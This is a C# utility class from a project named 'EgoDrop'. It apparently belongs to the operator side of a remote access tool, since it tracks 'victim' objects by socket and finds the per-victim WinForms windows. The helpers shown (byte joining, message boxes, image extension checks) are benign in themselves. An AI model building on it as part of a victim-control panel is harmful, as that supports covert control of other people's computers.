using System;
using System.CodeDom;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace EgoDrop
{
    public class clsTools
    {
        public clsTools()
        {

        }

        public static byte[] fnabCombineBytes(byte[] abFirstBytes, byte[] abSecondBytes) => fnabCombineBytes(abFirstBytes, 0, abFirstBytes.Length, abSecondBytes, 0, abSecondBytes.Length);
        public static byte[] fnabCombineBytes(byte[] abFirstBytes, int nFirstIndex, int nFirstLength, byte[] abSecondBytes, int nSecondIndex, int nSecondLength)
        {
            byte[] abBytes = new byte[nFirstLength + nSecondLength];
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(abFirstBytes, nFirstIndex, nFirstLength);
                ms.Write(abSecondBytes, nSecondIndex, nSecondLength);

                abBytes = ms.ToArray();
            }

            return abBytes;
        }

        public static bool fnbSameVictim(clsVictim v1, clsVictim v2)
        {
            return v1.m_sktClnt == v2.m_sktClnt;
        }

        public static T fnFindForm<T>(clsVictim victim, string szVictimID) where T : Form
        {
            foreach (Form f in Application.OpenForms)
            {
                if (f.GetType() == typeof(T))
                {
                    PropertyInfo ptyVictim = f.GetType().GetProperty("m_victim", BindingFlags.Public | BindingFlags.Instance | BindingFlags.NonPublic);
                    PropertyInfo ptyID = f.GetType().GetProperty("m_szVictimID", BindingFlags.Public | BindingFlags.Instance | BindingFlags.NonPublic);
                    if (ptyVictim != null && ptyID != null)
                    {
                        object fieldValue1 = ptyVictim.GetValue(f);
                        object fieldValue2 = ptyID.GetValue(f);
                        if (fieldValue1 != null && fnbSameVictim(victim, (clsVictim)fieldValue1) &&
                            string.Equals(szVictimID, (string)fieldValue2)
                        )
                        {
                            return (T)f;
                        }
                    }
                }
            }

            return null;
        }

        public static void fnShowErrMsgbox(string szMsg, string szTitle = "Error") => MessageBox.Show(szMsg, szTitle, MessageBoxButtons.OK, MessageBoxIcon.Error);
        public static void fnShowInfoMsgbox(string szMsg, string szTitle = "OK") => MessageBox.Show(szMsg, szTitle, MessageBoxButtons.OK, MessageBoxIcon.Information);

        public static bool fnbIsImage(string szFilePath)
        {
            string[] asExt =
            {
                "png",
                "jpg",
                "bmp",
            };

            string szExt = szFilePath.Split('.').Last();

            return asExt.Contains(szExt);
        }
    }
}
